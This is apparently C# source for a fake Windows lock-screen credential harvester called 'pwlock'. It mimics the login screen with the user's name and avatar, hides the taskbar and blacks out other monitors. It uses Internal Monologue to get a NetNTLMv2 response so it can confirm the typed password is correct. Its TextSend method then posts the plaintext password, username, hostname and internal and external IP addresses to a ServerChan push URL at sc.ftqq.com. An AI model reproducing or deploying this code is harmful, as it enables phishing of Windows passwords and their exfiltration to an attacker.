using NetNTLMv2Checker;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Net.Sockets;
using System.Text;

namespace pwlock
{

    public partial class LockScreenForm : Form
    {
        string[] args = null;

        [DllImport("user32.dll")]
        internal static extern int SetWindowCompositionAttribute(IntPtr hwnd, ref WindowCompositionAttributeData data);

        [StructLayout(LayoutKind.Sequential)]
        internal struct WindowCompositionAttributeData
        {
            public WindowCompositionAttribute Attribute;
            public IntPtr Data;
            public int SizeOfData;
        }

        internal enum WindowCompositionAttribute
        {
            WCA_ACCENT_POLICY = 19
        }

        internal enum AccentState
        {
            ACCENT_DISABLED = 0,
            ACCENT_ENABLE_GRADIENT = 1,
            ACCENT_ENABLE_TRANSPARENTGRADIENT = 2,
            ACCENT_ENABLE_BLURBEHIND = 3,
            ACCENT_INVALID_STATE = 4
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct AccentPolicy
        {
            public AccentState AccentState;
            public int AccentFlags;
            public int GradientColor;
            public int AnimationId;
        }

        internal void EnableBlur()
        {
            var accent = new AccentPolicy();
            var accentStructSize = Marshal.SizeOf(accent);
            accent.AccentState = AccentState.ACCENT_ENABLE_BLURBEHIND;

            var accentPtr = Marshal.AllocHGlobal(accentStructSize);
            Marshal.StructureToPtr(accent, accentPtr, false);

            var data = new WindowCompositionAttributeData();
            data.Attribute = WindowCompositionAttribute.WCA_ACCENT_POLICY;
            data.SizeOfData = accentStructSize;
            data.Data = accentPtr;

            SetWindowCompositionAttribute(this.Handle, ref data);

            Marshal.FreeHGlobal(accentPtr);
        }


        public LockScreenForm(string[] args)
        {
            InitializeComponent();
            this.args = args;
            Taskbar.Hide();
            GraphicsPath gp = new GraphicsPath();

            gp.AddEllipse(ProfileIcon.ClientRectangle);

            Region region = new Region(gp);

            ProfileIcon.Region = region;

            string userName = Environment.UserName;
            UserNameLabel.Text = userName;//获取当前用户名
            System.Security.Principal.WindowsIdentity currentUser = System.Security.Principal.WindowsIdentity.GetCurrent();
            string usersid = currentUser.User.ToString();//获取当前用户sid
            //Console.WriteLine(usersid);
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            DirectoryInfo userimage = new DirectoryInfo(@"C:\users\" + userName + @"\appdata\Roaming\Microsoft\Windows\AccountPictures\");
            FileInfo[] userfiles = userimage.GetFiles();
            string user_image_path;
            //Console.WriteLine(userfiles.Length);
            if (userfiles.Length > 1)
            {
                user_image_path = userfiles[0].FullName;
                //当前用户头像
                FileStream fs = new FileStream(user_image_path, FileMode.Open, FileAccess.Read);
                BinaryReader br = new BinaryReader(fs);
                int length = (int)fs.Length;
                string filehex = "";
                while (length > 0)
                {
                    byte tempByte = br.ReadByte();
                    string tempStr = Convert.ToString(tempByte, 16);
                    if (tempStr.Length == 1) tempStr = "0" + tempStr;
                    //sw.Write(tempStr);
                    filehex += tempStr;
                    length--;
                }
                //Console.WriteLine("All:"+filehex);
                string filehex2 = filehex.Replace("ffd8", "~");
                string[] filehexs = filehex2.Split('~');
                string userhex = "ffd8" + filehexs[2];
                //Console.WriteLine(userhex);
                //Console.WriteLine(filehexs[2]);
                System.IO.FileStream sw = new System.IO.FileStream(userfiles[0].DirectoryName + @"\lock.jpg", System.IO.FileMode.Create, System.IO.FileAccess.Write);
                int NumberChars = userhex.Length;
                for (int i = 0; i < NumberChars; i += 2)
                    sw.WriteByte(Convert.ToByte(userhex.Substring(i, 2), 16));//提取头像中的图片
                fs.Close();
                br.Close();
                sw.Close();
                ProfileIcon.Image = Image.FromFile(userfiles[0].DirectoryName + @"\lock.jpg");
            }
            else
            {
                user_image_path = @"C:\ProgramData\Microsoft\User Account Pictures\user.png";
                ProfileIcon.Image = Image.FromFile(user_image_path);
            }
            
            TopMost = true;


            UserNameLabel.BackColor = Color.Transparent;

            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;

            PasswordTextBox.Top = usernameloch;
            PasswordTextBox.UseSystemPasswordChar = true;
            ProfileIcon.Top = usericonh;
            SubmitPasswordButton.Top = buttonh;
            UserNameLabel.Top = usernameh;
            LockedLabel.Top = locked;

            foreach (var screen in Screen.AllScreens)
            {
                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }
        }

        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception ex)
            {
                // log errors
            }
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        public object WindowBlur { get; }

        protected override void OnClosing(CancelEventArgs e)
        {
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {

        }
        /// <summary>
        /// 获取页面html
        /// </summary>
        /// <param name="url">请求的地址</param>
        /// <param name="encoding">编码方式</param>
        /// <returns></returns>
        public static string HttpGetPageHtml(string url, string encoding)
        {
            string pageHtml = string.Empty;
            try
            {
                using (WebClient MyWebClient = new WebClient())
                {
                    Encoding encode = Encoding.GetEncoding(encoding);
                    MyWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36");
                    MyWebClient.Credentials = CredentialCache.DefaultCredentials;//获取或设置用于向Internet资源的请求进行身份验证的网络凭据
                    Byte[] pageData = MyWebClient.DownloadData(url); //从指定网站下载数据
                    pageHtml = encode.GetString(pageData);
                }
            }
            catch (Exception e)
            {

            }
            return pageHtml;
        }
        /// <summary>
        /// 从html中通过正则找到ip信息(只支持ipv4地址)
        /// </summary>
        /// <param name="pageHtml"></param>
        /// <returns></returns>
        public static string GetIPFromHtml(String pageHtml)
        {
            //验证ipv4地址
            string reg = @"(?:(?:(25[0-5])|(2[0-4]\d)|((1\d{2})|([1-9]?\d)))\.){3}(?:(25[0-5])|(2[0-4]\d)|((1\d{2})|([1-9]?\d)))";
            string ip = "";
            Match m = Regex.Match(pageHtml, reg);
            if (m.Success)
            {
                ip = m.Value;
            }
            return ip;
        }

        private string Localip()
        {
            string ip = "1.1.1.1";
            try
            {
                string HostName = Dns.GetHostName(); //得到主机名
                IPHostEntry IpEntry = Dns.GetHostEntry(HostName);
                for (int i = 0; i < IpEntry.AddressList.Length; i++)
                {
                    //从IP地址列表中筛选出IPv4类型的IP地址
                    //AddressFamily.InterNetwork表示此IP为IPv4,
                    //AddressFamily.InterNetworkV6表示此地址为IPv6类型
                    if (IpEntry.AddressList[i].AddressFamily == AddressFamily.InterNetwork)
                    {
                        ip = IpEntry.AddressList[i].ToString();
                        return ip;
                    }
                }
                return ip;
            }
            catch (Exception ex)
            {
                MessageBox.Show("获取本机IP出错:" + ex.Message);
                return ip;
            }
        }

        private void TextSend()
        {
            string Nip = GetIPFromHtml(HttpGetPageHtml("https://www.ip.cn", "utf-8"));
            string Lip = Localip();
            string hostname = Dns.GetHostName();
            string hostfullnmae = Dns.GetHostEntry("localhost").HostName;
            HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("https://sc.ftqq.com/" + args[0] + ".send");
            request.Method = "POST";
            string postData = string.Format("外网IP：{0} 内网IP：{1} 计算机名：{2} 计算机全名：{3} 当前用户：{4} 密码：{5}", Nip, Lip, hostname, hostfullnmae, Environment.UserName, PasswordTextBox.Text);
            byte[] payload = System.Text.Encoding.UTF8.GetBytes("text=老板，来活了~&desp=" + postData);
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = payload.Length;
            Stream newStream = request.GetRequestStream();
            newStream.Write(payload, 0, payload.Length);
            newStream.Close();
        }

        private void SubmitPasswordButton_Click(object sender, EventArgs e)
        {
            string plainpassword = PasswordTextBox.Text;
            //Console.WriteLine(plainpassword);
            bool impersonate = true, threads = false, downgrade = true, restore = true, verbose = false;
            string challenge = "1122334455667788";
            var monologue = new InternalMonologue(impersonate, threads, downgrade, restore, challenge, verbose);
            var monologueConsole = monologue.Go();
            var netntlmv2 = monologueConsole.Output();
            string netntlmv2str = netntlmv2.ToString();
            string netNTLMv2Response = netntlmv2.Replace("\n", String.Empty); ;
            IMChecker checker = new IMChecker(netNTLMv2Response);
            if (checker.checkPassword(plainpassword))
            {
                TextSend();
                Taskbar.Show();
                Application.Exit();
            }
            else
            {
                LockedLabel.Text = "密码不正确。请再试一次。";
            }

        }

        private void LockScreenForm_Load(object sender, EventArgs e)
        {
            EnableBlur();
        }

        static int tableWidth = 73;

        static void PrintLine()
        {
            Console.WriteLine(new string('-', tableWidth));
        }

        static void PrintRow(params string[] columns)
        {
            int width = (tableWidth - columns.Length) / columns.Length;
            string row = "|";

            foreach (string column in columns)
            {
                row += AlignCentre(column, width) + "|";
            }

            Console.WriteLine(row);
        }

        static string AlignCentre(string text, int width)
        {
            text = text.Length > width ? text.Substring(0, width - 3) + "..." : text;

            if (string.IsNullOrEmpty(text))
            {
                return new string(' ', width);
            }
            else
            {
                return text.PadRight(width - (width - text.Length) / 2).PadLeft(width);
            }
        }

        /* Adapted from https://github.com/opdsealey/NetNTLMv2PasswordChecker/blob/master/NetNTLMv2Checker/Program.cs */
        public class IMChecker
        {
            /* Designed to allow for checking a password locally against the output from Internal Monologue (netNTLMv2 Response) */
            public IMChecker(string netNTLMv2Response)
            {
                originalMessage = netNTLMv2Response;
                parseOriginal();
            }



            private void parseOriginal()
            {
                String[] separators = { ":" };
                String[] strlist = originalMessage.Split(separators, 5, StringSplitOptions.RemoveEmptyEntries);

                username = strlist[0];
                target = strlist[1];
                serverChallenge = utils.StringToByteArray(strlist[2]);
                netNtlmv2ResponseOriginal = utils.StringToByteArray(strlist[3]);
                blob = utils.StringToByteArray(strlist[4]);

            }

            public bool checkPassword(string password)
            {
                byte[] ntlmv2ResponseHash = new byte[16];
                ntlmv2ResponseHash = ntlm.getNTLMv2Response(target, username, password, serverChallenge, blob);
                //Console.WriteLine("Response Hash: " + utils.ByteArrayToString(ntlmv2ResponseHash));
                //Console.WriteLine("Original Hash: " + utils.ByteArrayToString(netNtlmv2ResponseOriginal));
                return ntlmv2ResponseHash.SequenceEqual(netNtlmv2ResponseOriginal);
            }

            public string originalMessage { get; set; }
            private string username { get; set; }
            private string target { get; set; }
            private byte[] serverChallenge { get; set; }

            private byte[] blob { get; set; }
            private byte[] netNtlmv2ResponseOriginal { get; set; }



        }
    }
}
